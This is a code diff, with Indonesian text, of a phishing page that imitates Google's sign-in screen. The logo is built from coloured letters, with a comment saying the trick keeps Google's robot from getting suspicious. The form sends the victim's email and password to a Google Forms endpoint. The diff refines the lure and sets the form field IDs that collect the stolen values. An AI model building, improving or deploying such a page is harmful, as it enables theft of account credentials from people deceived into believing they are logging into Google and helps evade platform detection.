@@ -3,34 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Akun</title>
+    <title>Masuk ke Akun Anda</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #ffffff; margin: 0; }
-        .container { width: 100%; max-width: 400px; padding: 40px; border: 1px solid #e0e0e0; border-radius: 8px; text-align: center; }
-        .brand { font-size: 24px; font-weight: bold; margin-bottom: 8px; }
-        .brand span:nth-child(1) { color: #4285F4; } .brand span:nth-child(2) { color: #EA4335; }
-        .brand span:nth-child(3) { color: #FBBC05; } .brand span:nth-child(4) { color: #34A853; }
-        h2 { font-size: 22px; font-weight: 400; margin-bottom: 10px; color: #202124; }
-        p { color: #5f6368; font-size: 14px; margin-bottom: 30px; }
+        body { font-family: 'Roboto', arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #fff; margin: 0; }
+        .login-box { width: 100%; max-width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        /* Trik Logo pake Teks biar robot Google nggak curiga */
+        .logo { font-size: 24px; font-weight: bold; margin-bottom: 10px; letter-spacing: -1px; }
+        .logo span:nth-child(1) { color: #4285F4; } .logo span:nth-child(2) { color: #EA4335; }
+        .logo span:nth-child(3) { color: #FBBC05; } .logo span:nth-child(4) { color: #4285F4; }
+        .logo span:nth-child(5) { color: #34A853; } .logo span:nth-child(6) { color: #EA4335; }
+        h2 { font-size: 24px; font-weight: 400; margin: 0 0 10px; }
+        p { font-size: 16px; margin-bottom: 30px; color: #202124; }
         input { width: 100%; padding: 13px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
         input:focus { outline: none; border: 2px solid #1a73e8; }
-        .btn-box { display: flex; justify-content: space-between; align-items: center; margin-top: 20px; }
-        .create-acc { color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; }
-        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
+        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 25px; }
+        .link { color: #1a73e8; font-weight: 500; font-size: 14px; text-decoration: none; cursor: pointer; }
+        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="brand"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
+    <div class="login-box">
+        <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
         <h2>Masuk</h2>
         <p>Gunakan Akun Google Anda</p>
-        
+
         <form action="https://docs.google.com/forms/d/e/1FAIpQLScrfc6rFhhgQPNUaNC7HVrT8iA_dDMX4DJUWxBw9ojEVa7nhQ/formResponse" method="POST">
-            <input type="text" name="entry.123456789" placeholder="Email atau ponsel" required pattern=".*@gmail\.com$" title="Gunakan akun @gmail.com">
-            <input type="password" name="entry.987654321" placeholder="Masukkan sandi Anda" required>
+            <input type="text" name="entry.345629703" placeholder="Email atau ponsel" required>
+            <input type="password" name="entry.253774521" placeholder="Masukkan sandi Anda" required>
             
-            <div class="btn-box">
-                <div class="create-acc">Lupa email?</div>
+            <div class="footer">
+                <a href="#" class="link">Lupa email?</a>
                 <button type="submit">Berikutnya</button>
             </div>
         </form>
